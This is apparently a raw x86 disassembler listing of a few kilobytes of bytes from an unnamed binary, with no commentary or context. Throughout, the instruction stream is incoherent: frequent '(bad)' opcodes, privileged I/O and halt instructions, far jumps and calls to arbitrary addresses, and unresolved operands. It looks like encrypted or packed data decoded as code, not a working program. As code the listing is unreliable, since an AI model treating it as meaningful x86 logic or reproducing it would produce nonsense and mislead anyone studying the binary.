  41ba2d:	xchg   edi,eax
  41ba2e:	mov    edi,DWORD PTR [esi+edx*1-0x473b5158]
  41ba35:	push   esp
  41ba36:	repz add dh,BYTE PTR [ecx]
  41ba39:	cwde   
  41ba3a:	enter  0x1180,0xbd
  41ba3e:	mov    esi,0x85e4859a
  41ba43:	xor    cl,BYTE PTR [edx+0xe8b5ff5]
  41ba49:	dec    ecx
  41ba4a:	cld    
  41ba4b:	sub    eax,esp
  41ba4d:	cmp    dh,bl
  41ba4f:	sub    edi,DWORD PTR [eax+0x10]
  41ba52:	js     0x41baa9
  41ba54:	es mov ah,0x9d
  41ba57:	jl     0x41ba59
  41ba59:	push   edi
  41ba5a:	mov    DWORD PTR [ecx],esp
  41ba5c:	and    bl,bl
  41ba5e:	(bad)  
  41ba5f:	sub    esp,esp
  41ba61:	std    
  41ba62:	jne    0x41ba5a
  41ba64:	xor    eax,DWORD PTR [edi-0x14]
  41ba67:	adc    DWORD PTR [ecx+ebp*2],0xffffff91
  41ba6b:	pop    es
  41ba6c:	and    BYTE PTR [edx-0x651b801c],ah
  41ba72:	dec    bl
  41ba74:	sahf   
  41ba75:	aaa    
  41ba76:	jmp    0xcceb:0x5152f189
  41ba7d:	jp     0x41babe
  41ba7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba80:	mov    cl,0x13
  41ba82:	inc    esp
  41ba83:	add    DWORD PTR [edx-0x5d],ecx
  41ba86:	xor    al,BYTE PTR [edx]
  41ba88:	xor    DWORD PTR [edx+eiz*1-0x46],ebx
  41ba8c:	pop    es
  41ba8d:	in     eax,dx
  41ba8e:	inc    ebx
  41ba8f:	sub    BYTE PTR [ecx-0x7d],0xae
  41ba93:	sbb    eax,0xffb8f1d0
  41ba98:	imul   BYTE PTR [eax+0x72]
  41ba9b:	push   eax
  41ba9c:	hlt    
  41ba9d:	into   
  41ba9e:	popa   
  41ba9f:	ins    DWORD PTR es:[edi],dx
  41baa0:	push   edx
  41baa1:	mov    ebp,ecx
  41baa3:	or     eax,0x8a6acfab
  41baa8:	mov    ecx,0xb99033cc
  41baad:	mov    ch,0x2d
  41baaf:	push   ss
  41bab0:	inc    ebx
  41bab1:	popa   
  41bab2:	pop    esp
  41bab3:	mov    DWORD PTR [ecx-0x6a1d89ef],ebx
  41bab9:	mov    ebp,0xae06c2c6
  41babe:	inc    edx
  41babf:	push   0x42a681ff
  41bac4:	test   BYTE PTR [ecx],ah
  41bac6:	ins    BYTE PTR es:[edi],dx
  41bac7:	xchg   edi,eax
  41bac8:	test   al,0xf0
  41baca:	ins    DWORD PTR es:[edi],dx
  41bacb:	ss idiv ch
  41bace:	div    DWORD PTR [ebp+0x53]
  41bad1:	fistp  WORD PTR [ecx]
  41bad3:	repnz or al,BYTE PTR [ecx+eiz*1+0x3b]
  41bad8:	xor    BYTE PTR [esi+0x26],bh
  41badb:	inc    edx
  41badc:	(bad)  
  41badd:	xchg   esi,eax
  41bade:	mov    ah,0xa8
  41bae0:	add    BYTE PTR [ebp-0x36c3aded],0x8f
  41bae7:	and    DWORD PTR [edi+0x19],esi
  41baea:	mov    bl,al
  41baec:	push   ss
  41baed:	ror    DWORD PTR [ebx+0x42d0e862],0xca
  41baf4:	imul   esp,DWORD PTR [ecx+0x9],0xfd7ed35e
  41bafb:	into   
  41bafc:	repnz mov ch,0x6c
  41baff:	adc    edx,DWORD PTR [esi+0x61700883]
  41bb05:	jo     0x41baef
  41bb07:	push   0x68
  41bb09:	jle    0x41bada
  41bb0b:	outs   dx,DWORD PTR ds:[esi]
  41bb0c:	cli    
  41bb0d:	mov    cl,0x45
  41bb0f:	adc    ebx,ebx
  41bb11:	in     al,0x54
  41bb13:	ss dec eax
  41bb15:	dec    esi
  41bb16:	xchg   edi,eax
  41bb17:	inc    ecx
  41bb18:	loop   0x41bb16
  41bb1a:	outs   dx,BYTE PTR ds:[esi]
  41bb1b:	cmp    esi,DWORD PTR [edi]
  41bb1d:	loop   0x41bb31
  41bb1f:	gs xchg ecx,eax
  41bb21:	xor    DWORD PTR [edx+0x41632bbf],esp
  41bb27:	test   eax,0xb89dbca7
  41bb2c:	test   DWORD PTR [ebp+0x3b229169],esi
  41bb32:	aam    0x21
  41bb34:	pop    ebp
  41bb35:	sbb    eax,0xf7ed8ad1
  41bb3a:	push   ds
  41bb3b:	sub    eax,0x6ff41a75
  41bb40:	iret   
  41bb41:	pop    edx
  41bb42:	sbb    eax,0x11b9bc9e
  41bb47:	ins    BYTE PTR es:[edi],dx
  41bb48:	aad    0x5c
  41bb4a:	or     DWORD PTR [edi],esi
  41bb4c:	mov    ch,0xd7
  41bb4e:	inc    ebp
  41bb4f:	push   ss
  41bb50:	xor    al,0x9b
  41bb52:	xchg   BYTE PTR [esi+0x671bebd5],bh
  41bb58:	mov    ch,0x24
  41bb5a:	mov    esi,0x37559add
  41bb5f:	sub    eax,0xe805d5b6
  41bb64:	imul   esi,DWORD PTR [eax],0xb3de27f0
  41bb6a:	adc    bh,BYTE PTR [edx+0x4f]
  41bb6d:	hlt    
  41bb6e:	sbb    ch,BYTE PTR [eax+0x4aa92579]
  41bb74:	pop    ebp
  41bb75:	and    edi,edx
  41bb77:	sahf   
  41bb78:	scas   al,BYTE PTR es:[edi]
  41bb79:	not    BYTE PTR [eax-0x63]
  41bb7c:	loope  0x41bbd3
  41bb7e:	push   esi
  41bb7f:	xchg   esp,eax
  41bb80:	das    
  41bb81:	mov    bl,0x3c
  41bb83:	mov    dh,0xdf
  41bb85:	ja     0x41bb94
  41bb87:	adc    al,0xa
  41bb89:	ror    BYTE PTR [ecx+0x2bc87b2d],1
  41bb8f:	aam    0xb6
  41bb91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb92:	mov    eax,ds:0x7142962e
  41bb97:	and    edx,ebx
  41bb99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb9a:	xchg   DWORD PTR es:[eax],esi
  41bb9d:	dec    esp
  41bb9e:	ror    ch,1
  41bba0:	ret    
  41bba1:	mov    bl,0xb8
  41bba3:	(bad)  
  41bba4:	enter  0xb9f4,0xb7
  41bba8:	push   0xd710cacd
  41bbad:	jge    0x41bbf1
  41bbaf:	imul   edi,edi,0xc326fce1
  41bbb5:	in     eax,dx
  41bbb6:	scas   al,BYTE PTR es:[edi]
  41bbb7:	repnz and eax,0x7a576862
  41bbbd:	xchg   edx,eax
  41bbbe:	xchg   bl,ch
  41bbc0:	push   ecx
  41bbc1:	jle    0x41bb6d
  41bbc3:	lock aad 0xda
  41bbc6:	dec    edx
  41bbc7:	mov    al,0x30
  41bbc9:	mov    ebp,0xf828e5b2
  41bbce:	stc    
  41bbcf:	mov    edi,0x9005ab19
  41bbd4:	in     eax,dx
  41bbd5:	imul   ebp,DWORD PTR [eax],0x26a97dcc
  41bbdb:	mov    edi,0xa65940f1
  41bbe0:	rcl    DWORD PTR [edx+0x63],0x93
  41bbe4:	mov    al,ds:0x1770b9c7
  41bbe9:	dec    ebp
  41bbea:	fcomp  DWORD PTR [esi+0x55]
  41bbed:	xor    al,0x57
  41bbef:	xchg   ebp,eax
  41bbf0:	adc    edx,DWORD PTR [eax-0x3de3fd94]
  41bbf6:	mov    al,0x23
  41bbf8:	mov    ebx,0x1c059b2b
  41bbfd:	(bad)  
  41bbfe:	ins    BYTE PTR es:[edi],dx
  41bbff:	xchg   ebp,eax
  41bc00:	fld    DWORD PTR [ebx-0x60797244]
  41bc06:	inc    ebp
  41bc07:	call   DWORD PTR [ecx+esi*1]
  41bc0a:	lock es ins DWORD PTR es:[edi],dx
  41bc0d:	pop    ebp
  41bc0e:	sub    DWORD PTR [ebp+edi*8-0x6b82cb1e],esp
  41bc15:	mov    esi,0x856d64ec
  41bc1a:	xor    al,0xbc
  41bc1c:	sbb    ecx,DWORD PTR [edi]
  41bc1e:	jp     0x41bc43
  41bc20:	mov    ebp,0xe166440c
  41bc25:	sbb    edi,ebx
  41bc27:	and    edi,DWORD PTR [ebx-0x70]
  41bc2a:	nop
  41bc2b:	inc    ebp
  41bc2c:	dec    esp
  41bc2d:	pop    ss
  41bc2e:	sub    ecx,ebp
  41bc30:	mov    ds:0xf98d8859,eax
  41bc35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc36:	test   ch,ch
  41bc38:	ins    DWORD PTR es:[edi],dx
  41bc39:	and    bh,BYTE PTR [edi-0x647e9f01]
  41bc3f:	nop
  41bc40:	aam    0x50
  41bc42:	push   es
  41bc43:	adc    BYTE PTR [ebx+0x3e],dh
  41bc46:	fidiv  WORD PTR [edx+0x4]
  41bc49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc4a:	jae    0x41bcb7
  41bc4c:	dec    ecx
  41bc4d:	adc    esp,ecx
  41bc4f:	mov    WORD PTR [edx],ds
  41bc51:	push   ebp
  41bc52:	ins    BYTE PTR es:[edi],dx
  41bc53:	out    dx,eax
  41bc54:	les    eax,FWORD PTR [ebp-0x2feb2f82]
  41bc5a:	jmp    0x43c0:0xa4d7a3ac
  41bc61:	mov    esp,0xd4b989c7
  41bc66:	adc    ebx,DWORD PTR [edi-0x2d4e12a5]
  41bc6c:	clc    
  41bc6d:	rol    ebx,0x2f
  41bc70:	push   ecx
  41bc71:	xor    DWORD PTR ds:0xde72908e,eax
  41bc77:	ret    
  41bc78:	in     al,dx
  41bc79:	jg     0x41bcd6
  41bc7b:	mov    ebx,?
  41bc7d:	aam    0x22
  41bc7f:	mov    cl,BYTE PTR [esi-0x6b]
  41bc82:	in     eax,dx
  41bc83:	pusha  
  41bc84:	and    esi,ebp
  41bc86:	xchg   DWORD PTR [ecx],ecx
  41bc88:	aaa    
  41bc89:	xor    eax,0xba670777
  41bc8e:	sar    dl,1
  41bc90:	sti    
  41bc91:	inc    ecx
  41bc92:	pop    ebp
  41bc93:	pop    ds
  41bc94:	cdq    
  41bc95:	push   ebp
  41bc96:	(bad)  
  41bc97:	call   0xbaba6ffd
  41bc9c:	mov    edi,0x153945d0
  41bca1:	pop    ds
  41bca2:	cmp    eax,DWORD PTR [edi+esi*1-0x74]
  41bca6:	nop
  41bca7:	mov    ch,BYTE PTR [ebp-0x60]
  41bcaa:	sub    dh,BYTE PTR [eax]
  41bcac:	adc    DWORD PTR [ecx+0x42],0x97e5336e
  41bcb3:	jmp    FWORD PTR [ecx+ebx*8]
  41bcb6:	or     DWORD PTR [esi],edx
  41bcb8:	mov    ebp,0x9b198c35
  41bcbd:	aad    0x39
  41bcbf:	aad    0x21
  41bcc1:	pop    esp
  41bcc2:	jmp    0x41bd24
  41bcc4:	pop    ebp
  41bcc5:	jbe    0x41bcf4
  41bcc7:	xchg   edx,eax
  41bcc8:	jge    0x41bc4e
  41bcca:	loope  0x41bd1d
  41bccc:	mov    ecx,0x7e423ffd
  41bcd1:	cmp    edx,DWORD PTR [ebx-0x63]
  41bcd4:	pop    esp
  41bcd5:	mov    dh,ch
  41bcd7:	test   al,0xec
  41bcd9:	pop    ebx
  41bcda:	sub    BYTE PTR [esi],ch
  41bcdc:	div    BYTE PTR [ecx+0x6e]
  41bcdf:	pop    ds
  41bce0:	stos   DWORD PTR es:[edi],eax
  41bce1:	nop
  41bce2:	loopne 0x41bcf8
  41bce4:	aas    
  41bce5:	adc    edx,0xb803f57c
  41bceb:	dec    ebp
  41bcec:	add    edx,DWORD PTR [edi]
  41bcee:	mov    dh,0xa9
  41bcf0:	ins    DWORD PTR es:[edi],dx
  41bcf1:	pop    esi
  41bcf2:	inc    esi
  41bcf3:	or     dh,dh
  41bcf5:	rcl    DWORD PTR [eax],0x45
  41bcf8:	or     BYTE PTR [ecx+0x14],0xd
  41bcfc:	jmp    0x41bccd
  41bcfe:	and    dl,al
  41bd00:	pop    edx
  41bd01:	sub    eax,0xec686163
  41bd06:	cmp    al,bl
  41bd08:	push   0xffffffdd
  41bd0a:	xchg   ebp,eax
  41bd0b:	mov    ah,0x84
  41bd0d:	inc    ecx
  41bd0e:	or     dl,bh
  41bd10:	cmp    al,0xe
  41bd12:	clc    
  41bd13:	js     0x41bcc5
  41bd15:	cmp    al,0xc7
  41bd17:	(bad)  
  41bd18:	sbb    eax,0x1a8c307a
  41bd1d:	test   al,0x72
  41bd1f:	dec    esi
  41bd20:	cwde   
  41bd21:	icebp  
  41bd22:	loope  0x41bcf0
  41bd24:	call   0x26ac:0x56f8249a
  41bd2b:	xchg   DWORD PTR [esi+0x14c798aa],ecx
  41bd31:	(bad)  
  41bd32:	sbb    dl,bh
  41bd34:	retf   0xf12f
  41bd37:	mov    al,ds:0x2b239f81
  41bd3c:	sbb    al,0x6b
  41bd3e:	push   ds
  41bd3f:	xor    BYTE PTR [eax-0x58],dl
  41bd42:	and    ch,bh
  41bd44:	inc    ebp
  41bd45:	popa   
  41bd46:	ror    DWORD PTR [edx-0x3e],0xb6
  41bd4a:	xchg   ecx,eax
  41bd4b:	dec    esp
  41bd4c:	(bad)  
  41bd4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd4e:	mov    dh,ah
  41bd50:	clc    
  41bd51:	scas   al,BYTE PTR es:[edi]
  41bd52:	xor    BYTE PTR [ecx],bh
  41bd54:	ret    
  41bd55:	imul   ebx,ebx,0x789434ed
  41bd5b:	div    esi
  41bd5d:	sub    BYTE PTR [ebp-0x4f],ch
  41bd60:	jg     0x41bdb0
  41bd62:	jae    0x41bd16
  41bd64:	arpl   ax,di
  41bd66:	adc    DWORD PTR [esi],edi
  41bd68:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41bd6a:	add    esi,DWORD PTR [edi-0x6c]
  41bd6d:	sar    DWORD PTR [ecx+0x30],1
  41bd70:	sub    ecx,eax
  41bd72:	pop    edx
  41bd73:	mov    WORD PTR [ecx+0x20],gs
  41bd76:	push   ebx
  41bd77:	fiadd  WORD PTR [esi]
  41bd79:	arpl   WORD PTR [edx+0x2a],sp
  41bd7c:	add    BYTE PTR [edx],ah
  41bd7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd7f:	pop    esi
  41bd80:	call   0x1251108f
  41bd85:	in     eax,0x89
  41bd87:	mov    al,ds:0xcf61bf36
  41bd8c:	pop    eax
  41bd8d:	pop    esp
  41bd8e:	int3   
  41bd8f:	outs   dx,BYTE PTR ds:[esi]
  41bd90:	push   edi
  41bd91:	js     0x41bd57
  41bd93:	mul    dh
  41bd95:	sub    eax,0x7101323e
  41bd9a:	adc    esi,DWORD PTR ds:0xfbd72abd
  41bda0:	test   al,0x6a
  41bda2:	sub    cl,BYTE PTR ds:0x3a0ceadd
  41bda8:	leave  
  41bda9:	loope  0x41bd6a
  41bdab:	not    al
  41bdad:	xchg   edi,eax
  41bdae:	lods   al,BYTE PTR ds:[esi]
  41bdaf:	xchg   ebx,eax
  41bdb0:	sub    eax,0x4137f75c
  41bdb5:	xchg   edi,eax
  41bdb6:	push   edi
  41bdb7:	add    al,0xd4
  41bdb9:	retf   0x56b7
  41bdbc:	adc    dl,bh
  41bdbe:	sbb    ch,BYTE PTR [ecx]
  41bdc0:	cwde   
  41bdc1:	sub    ecx,ecx
  41bdc3:	or     BYTE PTR [ebx+0x2c8ebac0],dh
  41bdc9:	sub    cl,BYTE PTR [edi-0x1f1f68ac]
  41bdcf:	sar    DWORD PTR [ebx+ebp*1+0x6adf06d8],0x5b
  41bdd7:	fiadd  WORD PTR [esp+ecx*1]
  41bdda:	(bad)  
  41bddb:	mov    ecx,0xfaf74ac
  41bde0:	mov    esi,0xa6945679
  41bde5:	xchg   ebp,eax
  41bde6:	fwait
  41bde7:	pop    ebp
  41bde8:	push   ss
  41bde9:	sbb    dh,cl
  41bdeb:	add    edi,edx
  41bded:	(bad)  
  41bdee:	xor    edi,DWORD PTR [edx-0x32b86ce0]
  41bdf4:	adc    eax,0xedc3fe89
  41bdf9:	dec    edx
  41bdfa:	pop    ecx
  41bdfb:	arpl   sp,si
  41bdfd:	jbe    0x41bdeb
  41bdff:	xchg   esi,eax
  41be00:	and    DWORD PTR [ebx-0x52],edi
  41be03:	fwait
  41be04:	test   eax,0xc848164c
  41be09:	jl     0x41bdfa
  41be0b:	sbb    DWORD PTR ds:0x71d0ea3e,esp
  41be11:	jmp    0x761f15dc
  41be16:	jmp    0xd290:0xf50efe9b
  41be1d:	fbstp  TBYTE PTR [eax+0x57d07726]
  41be23:	sbb    edx,DWORD PTR [ebp-0x55d369bf]
  41be29:	pop    esi
  41be2a:	dec    edi
  41be2b:	dec    ecx
  41be2c:	mov    cl,0x60
  41be2e:	in     ax,0x6
  41be31:	adc    eax,edi
  41be33:	sub    eax,0xc46959dc
  41be38:	fsub   st,st(0)
  41be3a:	and    al,0xc9
  41be3c:	ins    BYTE PTR es:[edi],dx
  41be3d:	setbe  BYTE PTR ds:0x7631abdf
  41be44:	sbb    al,0x91
  41be46:	inc    esi
  41be47:	inc    esi
  41be48:	imul   esi,DWORD PTR [esi],0x9
  41be4b:	add    BYTE PTR [edx+ebx*1-0x76],al
  41be4f:	jmp    0xce85:0xa1961cd2
  41be56:	dec    DWORD PTR [edx+0x31]
  41be59:	sbb    al,0x85
  41be5b:	and    DWORD PTR [esi-0x2a],0xffffffac
  41be5f:	xchg   ebx,eax
  41be60:	sbb    bh,BYTE PTR [esi-0x22402156]
  41be66:	fstp   st(5)
  41be68:	int    0x9d
  41be6a:	mov    bl,0xb5
  41be6c:	icebp  
  41be6d:	dec    esi
  41be6e:	es mov bh,0x4b
  41be71:	icebp  
  41be72:	repz cli 
  41be74:	or     dl,dl
  41be76:	std    
  41be77:	bnd jnp 0x41be6b
  41be7a:	mov    ?,eax
  41be7c:	or     al,0x1
  41be7e:	dec    edx
  41be7f:	(bad)  
  41be81:	in     eax,dx
  41be82:	je     0x41be9a
  41be84:	sahf   
  41be85:	mov    BYTE PTR [ebx],ch
  41be87:	xor    ebx,esp
  41be89:	ins    DWORD PTR es:[edi],dx
  41be8a:	push   cs
  41be8b:	push   ebx
  41be8c:	mov    cl,0x92
  41be8e:	fs scas al,BYTE PTR es:[edi]
  41be90:	rol    DWORD PTR [edi+0x4f],cl
  41be93:	adc    al,0x81
  41be95:	dec    ebx
  41be96:	jg     0x41be64
  41be98:	test   DWORD PTR [ebp-0x2a],ecx
  41be9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be9c:	xchg   edi,eax
  41be9d:	lods   eax,DWORD PTR ds:[esi]
  41be9e:	adc    eax,0x2ded495d
  41bea3:	sub    eax,0x5cde5014
  41bea8:	jo     0x41bec5
  41beaa:	pop    edi
  41beab:	sub    al,0x1a
  41bead:	loop   0x41be9a
  41beaf:	push   ebx
  41beb0:	jne    0x41be78
  41beb2:	cmp    DWORD PTR [ebx],edx
  41beb4:	xchg   DWORD PTR [esi+0x9],esp
  41beb7:	stc    
  41beb8:	xor    DWORD PTR [ecx-0x2a],eax
  41bebb:	shl    edi,1
  41bebd:	inc    ebp
  41bebe:	xchg   ebp,eax
  41bebf:	push   cs
  41bec0:	xchg   ebp,eax
  41bec1:	cmp    al,0x5e
  41bec3:	(bad)  
  41bec4:	push   ecx
  41bec5:	in     al,0xd
  41bec7:	rcr    DWORD PTR [eax+0x51358500],cl
  41becd:	int3   
  41bece:	psraw  mm1,mm0
  41bed1:	jne    0x41bef1
  41bed3:	shr    DWORD PTR ds:0xc250b25c,cl
  41bed9:	test   al,0xf6
  41bedb:	(bad)  
  41bedd:	stos   BYTE PTR es:[edi],al
  41bede:	inc    DWORD PTR [esi]
  41bee0:	or     BYTE PTR [edi+eax*2-0x708d6319],dh
  41bee7:	push   ecx
  41bee8:	int3   
  41bee9:	dec    ecx
  41beea:	jl     0x41beec
  41beec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beed:	cwde   
  41beee:	adc    al,0x58
  41bef0:	mov    dl,0x93
  41bef2:	popa   
  41bef3:	push   esp
  41bef4:	sti    
  41bef5:	mov    ds:0xb24d31bc,al
  41befa:	test   DWORD PTR [edx+0x5e],ebx
  41befd:	enter  0xad7,0x3a
  41bf01:	sbb    eax,0x1a21652f
  41bf06:	ds imul esp,esi,0x8992da3a
  41bf0d:	adc    esi,edx
  41bf0f:	cmp    cl,BYTE PTR [ebx+ebp*2+0x524d8692]
  41bf16:	adc    dl,bh
  41bf18:	push   es
  41bf19:	imul   ecx,DWORD PTR [ebx-0x7e71c595],0x26
  41bf20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf21:	add    eax,ebx
  41bf23:	scas   al,BYTE PTR es:[edi]
  41bf24:	jmp    0x41beba
  41bf26:	call   0x8faa:0xf6ac8102
  41bf2d:	xchg   ecx,eax
  41bf2e:	les    ecx,FWORD PTR [edx-0x70]
  41bf31:	add    DWORD PTR ds:0xb2a3614c,ebx
  41bf37:	pop    eax
  41bf38:	push   edi
  41bf39:	pusha  
  41bf3a:	sub    cl,BYTE PTR [ebx]
  41bf3c:	ret    0xbf1f
  41bf3f:	(bad)  
  41bf40:	xor    eax,ebx
  41bf42:	push   eax
  41bf43:	jmp    0x41bf7e
  41bf45:	mov    ecx,0x6f7f8cb2
  41bf4a:	into   
  41bf4b:	dec    esp
  41bf4c:	pushf  
  41bf4d:	arpl   WORD PTR [ebp+0x4e2f1188],dx
  41bf53:	add    al,BYTE PTR [edi]
  41bf55:	and    esi,DWORD PTR [esi+0x19]
  41bf58:	in     al,0x91
  41bf5a:	mov    eax,ds:0x838ac2bf
  41bf5f:	adc    BYTE PTR [ebx],ah
  41bf61:	xchg   esi,eax
  41bf62:	cwde   
  41bf63:	inc    edx
  41bf64:	mov    bl,0xc9
  41bf66:	loopne 0x41bf65
  41bf68:	adc    al,0xcc
  41bf6a:	dec    esi
  41bf6b:	out    0xb3,al
  41bf6d:	jo     0x41bfba
  41bf6f:	and    eax,0x979e682e
  41bf74:	xchg   dh,bl
  41bf76:	inc    ebx
  41bf77:	xor    ecx,ecx
  41bf79:	jg     0x41bf8f
  41bf7b:	mov    bl,0x37
  41bf7d:	add    cl,ah
  41bf7f:	dec    ebx
  41bf80:	mov    ds:0x4225e32d,al
  41bf85:	jno    0x41bfa3
  41bf87:	shl    BYTE PTR [ebx+ecx*4],cl
  41bf8a:	xlat   BYTE PTR ds:[ebx]
  41bf8b:	jbe    0x41bf52
  41bf8d:	imul   esi,DWORD PTR [edi+0x76],0x68
  41bf91:	or     eax,0x8fc3627d
  41bf96:	pushf  
  41bf97:	ret    0x59cf
  41bf9a:	and    BYTE PTR [edi],bl
  41bf9c:	dec    esi
  41bf9d:	mov    bh,0x32
  41bf9f:	jbe    0x41bf5f
  41bfa1:	inc    eax
  41bfa2:	ret    
  41bfa3:	dec    edi
  41bfa4:	mov    cl,0xad
  41bfa6:	jbe    0x41bfd1
  41bfa8:	mov    bl,0xa1
  41bfaa:	or     esi,edi
  41bfac:	sub    BYTE PTR [edx],dh
  41bfae:	dec    eax
  41bfaf:	fild   DWORD PTR [esi-0x6e]
  41bfb2:	push   edx
  41bfb3:	pop    ebx
  41bfb4:	dec    edx
  41bfb5:	imul   esi,ebx,0x63e7543f
  41bfbb:	jmp    0x41bfa8
  41bfbd:	xchg   edx,eax
  41bfbe:	jmp    0x908e0110
  41bfc3:	push   edx
  41bfc4:	mov    esi,0x680ed2e6
  41bfc9:	fnstsw WORD PTR [edx-0x15bc5406]
  41bfcf:	mov    eax,0x7be9045b
  41bfd4:	pop    ebp
  41bfd5:	mov    esi,0xd1cfd3a
  41bfda:	ret    0x253
  41bfdd:	adc    al,0xd4
  41bfdf:	in     al,0x73
  41bfe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfe2:	sub    al,0x8
  41bfe4:	or     al,0x71
  41bfe7:	popa   
  41bfe8:	outs   dx,DWORD PTR ds:[esi]
  41bfe9:	or     al,0x47
  41bfeb:	retf   
  41bfec:	into   
  41bfed:	std    
  41bfee:	mov    DWORD PTR [edx-0x9],ecx
  41bff1:	cmp    eax,0x413d5959
  41bff6:	retf   0x83c9
  41bff9:	dec    ecx
  41bffa:	(bad)  
  41bffb:	mov    ebp,0xc5d671bb
  41c000:	icebp  
  41c001:	out    0x89,eax
  41c003:	push   0xffffffb9
  41c005:	jecxz  0x41bfd4
  41c007:	es daa 
  41c009:	cmp    dl,BYTE PTR [edi+0x5c]
  41c00c:	je     0x41bf92
  41c00e:	(bad)  
  41c00f:	aaa    
  41c010:	icebp  
  41c011:	repnz sub al,0x68
  41c014:	sbb    eax,0x66b6e1c
  41c019:	add    DWORD PTR [edi+0x287c0a0f],0x3174207b
  41c023:	xor    DWORD PTR ds:0xfc58b314,ecx
  41c029:	cmp    eax,0xf28752eb
  41c02e:	test   al,0x96
  41c030:	jbe    0x41c054
  41c032:	inc    esp
  41c033:	cmp    cl,BYTE PTR [ecx-0x5a]
  41c036:	cmp    eax,0x3d563b4a
  41c03b:	call   0x31f1:0x843fc194
  41c042:	shufps xmm4,XMMWORD PTR [edx],0x53
  41c046:	loopne 0x41c070
  41c048:	jnp    0x41c02f
  41c04a:	inc    esi
  41c04b:	xchg   esi,eax
  41c04c:	push   edx
  41c04d:	fimul  WORD PTR [esi]
  41c04f:	xchg   ecx,eax
  41c050:	jmp    0xdaea:0x60debda9
  41c057:	(bad)  
  41c059:	loop   0x41c04b
  41c05b:	call   0x959d:0xffd2e44b
  41c062:	(bad)  
  41c063:	fcmovbe st,st(4)
  41c065:	push   es
  41c066:	dec    esi
  41c067:	ret    0x2b97
  41c06a:	mov    esi,0xc3633492
  41c06f:	iret   
  41c070:	(bad)  
  41c071:	out    0x4c,eax
  41c073:	mov    ch,0x8e
  41c075:	(bad)  
  41c076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c077:	dec    edi
  41c078:	add    al,0x7a
  41c07a:	sub    BYTE PTR [esi+0x49bcc642],0xaf
  41c081:	add    DWORD PTR [edi],edi
  41c083:	sbb    BYTE PTR [edi-0x68edfbc6],bh
  41c089:	pop    edx
  41c08a:	je     0x41c0b1
  41c08c:	mov    ch,0x40
  41c08e:	fdiv   QWORD PTR [ecx-0x38]
  41c091:	adc    al,0x12
  41c093:	gs add eax,0x5b4232
  41c099:	cmp    ch,BYTE PTR fs:[ebx+0x7324b4ce]
  41c0a0:	mov    dh,0x3a
  41c0a2:	and    BYTE PTR [ecx],0xa6
  41c0a5:	int    0x15
  41c0a7:	cmp    DWORD PTR [ecx-0x2616f64c],0x73fb5f83
  41c0b1:	mov    ch,0x16
  41c0b3:	addr16 push cs
  41c0b5:	loopne 0x41c03a
  41c0b7:	sub    BYTE PTR [edi+edx*8+0x48],bh
  41c0bb:	sub    cl,BYTE PTR [ebp+0x36]
  41c0be:	mov    al,0x63
  41c0c0:	out    0x15,al
  41c0c2:	inc    edi
  41c0c3:	dec    ecx
  41c0c4:	fild   WORD PTR [ebx+0x433f6d05]
  41c0ca:	cmp    DWORD PTR [ebp+0x4f],0xf6d3cd11
  41c0d1:	pop    ss
  41c0d2:	and    BYTE PTR [ebx-0x4d3e38e0],dh
  41c0d8:	push   ds
  41c0d9:	rol    edx,cl
  41c0db:	or     DWORD PTR [edi-0x37c06982],ecx
  41c0e1:	ss inc ebp
  41c0e3:	pop    edx
  41c0e4:	inc    ecx
  41c0e5:	retf   
  41c0e6:	fwait
  41c0e7:	dec    esp
  41c0e8:	test   al,0x32
  41c0ea:	lods   al,BYTE PTR ds:[esi]
  41c0eb:	ror    BYTE PTR [ebp+ecx*8+0x23],cl
  41c0ef:	lds    ebp,FWORD PTR [ecx-0x74abf219]
  41c0f5:	mov    esi,0x23f4e183
  41c0fa:	jbe    0x41c175
  41c0fc:	fisttp DWORD PTR [ebx]
  41c0fe:	pop    edx
  41c0ff:	sub    esp,edi
  41c101:	mov    esi,DWORD PTR [eax+0x372d1edd]
  41c107:	loopne 0x41c134
  41c109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c10a:	mov    ah,0x7b
  41c10c:	xor    cl,0xc8
  41c10f:	jmp    0xaf59:0x4e5c9da1
  41c116:	inc    esi
  41c117:	in     al,0x75
  41c119:	ret    0x4993
  41c11c:	inc    eax
  41c11d:	jo     0x41c0ce
  41c11f:	call   0x46801e71
  41c124:	mov    esi,0x5ff8b60
  41c129:	scas   al,BYTE PTR es:[edi]
  41c12a:	js     0x41c120
  41c12c:	leave  
  41c12d:	mov    ebx,gs
  41c12f:	jge    0x41c10a
  41c131:	xchg   ecx,eax
  41c132:	jne    0x41c0f5
  41c134:	loopne 0x41c18e
  41c136:	xchg   ebx,eax
  41c137:	mov    ?,WORD PTR [eax+0x48]
  41c13a:	ins    DWORD PTR es:[edi],dx
  41c13b:	into   
  41c13c:	mov    edi,0x8acd2da1
  41c141:	popa   
  41c142:	dec    ebp
  41c143:	(bad)  
  41c144:	mov    bh,0x59
  41c146:	les    eax,FWORD PTR [edi]
  41c148:	add    DWORD PTR [ebx-0x14],ebp
  41c14b:	xor    BYTE PTR [eax+eax*2-0x404a879],bl
  41c152:	or     al,0xcd
  41c154:	mov    BYTE PTR [eax],dl
  41c156:	adc    eax,0xc9667542
  41c15b:	jl     0x41c17b
  41c15d:	jno    0x41c16f
  41c15f:	xor    al,0x3e
  41c161:	inc    esi
  41c162:	fsub   QWORD PTR [eax+0x66949dab]
  41c168:	mov    al,0xc9
  41c16a:	inc    esp
  41c16b:	rol    BYTE PTR [edx+ecx*4-0x6a],cl
  41c16f:	into   
  41c170:	clc    
  41c171:	pop    ss
  41c172:	mov    edx,0xf963aa85
  41c177:	dec    eax
  41c178:	jo     0x41c174
  41c17a:	fsubr  st,st(4)
  41c17c:	mov    DWORD PTR [ecx+0x6ce9ec2a],esp
  41c182:	retf   
